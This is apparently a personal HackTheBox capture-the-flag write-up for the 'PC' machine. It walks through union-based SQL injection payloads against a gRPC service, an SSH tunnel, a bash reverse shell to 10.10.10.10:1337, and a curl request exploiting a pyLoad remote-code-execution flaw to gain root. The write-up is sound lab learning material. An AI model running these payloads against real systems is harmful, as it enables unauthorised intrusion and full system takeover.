# PC

### Recon

- port 22 SSH
- port 50051 gRPC

Needed help identifying the port, [used this walkthrough](https://dickytrianza.medium.com/hackthebox-writeup-pc-b787db46f82b) for the gRPC part (remember to google default port 
next time!)

gRPC (Google Remote Procedure Call) is an open-source, high performance framework developed by Google that 
allows communication between client and server applications. It's designed to facilitate efficient and 
reliable data exchange between distributed systems and is commonly used in microservices architecture.

Connect to gRPC port with grpcui browser, or use Postman to send requests

`grpcui --plaintext 10.10.11.214:50051`

admin:admin is used as credentials

id parameter is injectable, sqlmap didn't work for me so looked [at this walkthrough](https://medium.com/@fares7elsadek/hackthebox-writeup-pc-1c0178023411)

Find first username, admin

```
{
	"id":"543 union SELECT username FROM accounts WHERE username NOT like 'sqlite_%' limit 1--"
}
```

Look at second username, sau

```
{
	"id":"543 union SELECT username FROM accounts LIMIT 1 OFFSET 1;"
}
```

Find password for sau

```
{
	"id":"543 SELECT password FROM accounts WHERE username='sau';"
}
```

linpeas.sh shows 127.0.0.1:8000 as listening  

Use an ssh tunnel to access pyload running on the target

`ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214`

Google shows pyload suffers from an [RCE vulnerability](https://www.exploit-db.com/exploits/51532) and ps aux shows it's running as root.

Write a bash reverse shell on the target

```
#!/bin/bash

bash -i >& /dev/tcp/10.10.10.10/1337 0>&1
```

Use curl to to execute the reverse shell granting root access to the target

`curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"bash%20/tmp/bash.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://127.0.0.1:8000/flash/addcrypted2'`

-i - include HTTP response headers in output
-s - silent mode
-k - insecure mode, skip verification step

*Note: $'' is ANSI-C quoting, allowing backslash-escaped characters to be replaced as specified by the ANSI C 
standard. [Source](https://www.gnu.org/software/bash/manual/html_node/ANSI_002dC-Quoting.html#ANSI_002dC-Quoting)*
